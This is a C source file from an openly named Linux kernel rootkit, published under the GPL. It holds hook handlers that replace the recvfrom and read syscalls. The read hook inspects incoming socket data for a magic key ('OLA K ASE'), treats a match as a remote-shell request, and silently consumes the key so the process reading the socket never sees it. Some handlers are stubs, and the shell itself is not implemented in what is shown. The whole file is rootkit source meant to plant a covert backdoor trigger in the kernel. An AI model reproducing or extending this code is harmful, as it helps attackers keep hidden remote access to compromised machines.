/***
 *      _  __  __     __
 *     /_) )_) )_)    )_) _   _  _)_ )_/ o _)_
 *    / / / \ /      / \ (_) (_) (_ /  ) ( (_
 *
 *//* License
 *
 * Copyright (c) 2018 Abel Romero Pérez aka D1W0U <abel@abelromero.com>
 *
 * This file is part of ARP RootKit.
 *
 * ARP RootKit is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * ARP RootKit is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with ARP RootKit.  If not, see <http://www.gnu.org/licenses/>.
 *
 *//* Notes
 *
 * Here the hook handlers.
 */

asmlinkage int my_recvfrom64(int fd, void __user * ubuf, size_t size, unsigned int flags, struct sockaddr __user *addr, int __user *addr_len) {
	int ret = 0;

	//SYSCALL64(__NR_write, 1, "hello from hook!\n", 17, 0, 0, 0);
	//ret = SYSCALL64(__NR_recvfrom, fd, ubuf, size, flags, addr, addr_len);
	return ret;
}

asmlinkage int my_recvfrom32(int fd, void __user * ubuf, size_t size, unsigned int flags, struct sockaddr __user *addr, int __user *addr_len) {
    int ret = 0;

    SYSCALL64(__NR_write, 1, "hello from hook!\n", 17, 0, 0, 0);
    //ret = SYSCALL32(__NR_recvfrom, fd, ubuf, size, flags, addr, addr_len);
    return ret;
}

#define RSHELL_KEY "OLA K ASE\n"

asmlinkage int my_read64(int fd, void *buf, size_t len) {
	int ret = 0, err = 0;
	struct socket *sock = NULL;
	struct sk_buff *skb = NULL;
	char *ubuf = NULL;
	struct file *file = NULL;
	struct skb_seq_state seq;
	unsigned int avail = 0;
	const unsigned char *ptr = NULL;

	file = f_fget(fd);
	if (file) {
		sock = f_sock_from_file(file, &err);
		if (sock && sock->type == SOCK_STREAM && (skb = skb_peek(&sock->sk->sk_receive_queue))) {
			f_skb_prepare_seq_read(skb, 0, skb->len, &seq);
			avail = f_skb_seq_read(0, &ptr, &seq);
			f_printk("avail = %d vs %d\n", avail, sizeof(RSHELL_KEY));
			f_skb_abort_seq_read(&seq);
			if ((sizeof(RSHELL_KEY) - 1) == avail && f_strncmp(RSHELL_KEY, ptr, avail) == 0) {
				f_printk("GOT RSHELL REQUEST!\n");
				ubuf = (void *) SYSCALL64(__NR_mmap, 0, 4096, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
				if (ubuf != MAP_FAILED) {
					f_fput(file);
					ret = SYSCALL64(__NR_read, fd, ubuf, avail, 0, 0, 0);
					SYSCALL64(__NR_munmap, ubuf, 4096, 0, 0, 0, 0);
					return my_read64(fd, buf, len);
				}
			}
		}
		f_fput(file);
	}
	return SYSCALL64(__NR_read, fd, buf, len, 0, 0, 0);
}

asmlinkage int my_read32(int fd, void *buf, size_t len) {
	return 0;
}
